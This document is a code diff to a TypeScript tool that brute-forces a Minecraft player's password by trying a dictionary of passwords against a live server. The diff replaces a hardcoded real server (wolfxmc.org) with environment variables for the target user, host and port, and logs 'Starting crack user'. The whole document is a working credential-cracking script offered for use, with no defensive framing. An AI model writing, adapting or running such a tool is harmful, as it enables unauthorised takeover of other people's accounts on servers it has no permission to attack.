@@ -18,7 +18,11 @@ async function tryPassword(mc: Minecraft, password: string) {
 	}
 }
 
-async function runOnce(targetUser: string) {
+const targetUser = process.env.TARGET_USER;
+const host = process.env.TARGET_HOST;
+const port = process.env.TARGET_PORT ? parseInt(process.env.TARGET_PORT) : 25565;
+
+async function runOnce() {
 	let lastSequence = 0;
 	try {
 		lastSequence = JSON.parse(await fs.readFile("./data/last.json", "utf-8")).lastSequence;
@@ -30,8 +34,8 @@ async function runOnce(targetUser: string) {
 	console.log(`Starting crack user ${targetUser}`);
 	const pool = new MinecraftPool(1, {
 		username: targetUser,
-		host: 'wolfxmc.org',
-		port: 25565
+		host,
+		port
 	});
 	try {
 		for (let i = lastSequence; i < dict.length; ++i) {
@@ -51,4 +55,4 @@ async function runOnce(targetUser: string) {
 		process.exit();
 	}
 }
-runOnce(process.argv[2]);
+runOnce();
